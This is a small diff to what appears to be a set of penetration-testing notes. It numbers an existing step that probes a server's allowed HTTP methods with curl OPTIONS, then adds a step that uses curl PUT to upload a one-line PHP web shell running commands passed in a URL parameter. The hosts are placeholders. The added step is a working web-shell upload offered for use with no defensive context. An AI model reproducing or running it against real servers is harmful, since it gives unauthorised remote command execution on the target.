@@ -1,3 +1,7 @@
-Exam the HTTP options:
+1. Exam the HTTP options:
 
 curl -v -X OPTIONS http://xxx.xx/xxx/
+
+2. Upload files:
+
+curl -X PUT -d '<?php system($_GET["cmd"]);' http://xxx/xxx/phpsimpleshell.php
